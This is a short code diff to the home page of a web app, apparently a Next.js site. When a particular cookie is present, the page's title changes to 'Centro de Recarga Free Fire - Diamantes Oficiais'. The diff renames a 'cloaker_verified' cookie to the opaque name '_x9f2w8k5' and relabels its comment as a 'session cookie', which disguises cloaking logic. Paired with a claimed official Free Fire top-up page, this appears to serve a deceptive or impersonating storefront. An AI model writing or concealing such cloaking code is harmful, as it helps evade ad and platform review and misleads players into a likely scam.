@@ -24,12 +24,12 @@ export default function HomePage() {
     html.style.colorScheme = 'light'
   }, [])
 
-  // Mudar título se tiver cookie do cloaker
+  // Mudar título se tiver cookie de sessão
   useEffect(() => {
     if (typeof window === 'undefined') return
     
-    const hasCloakerCookie = document.cookie.includes('cloaker_verified=true')
-    if (hasCloakerCookie) {
+    const hasSessionCookie = document.cookie.includes('_x9f2w8k5=true')
+    if (hasSessionCookie) {
       document.title = 'Centro de Recarga Free Fire - Diamantes Oficiais'
     }
   }, [])
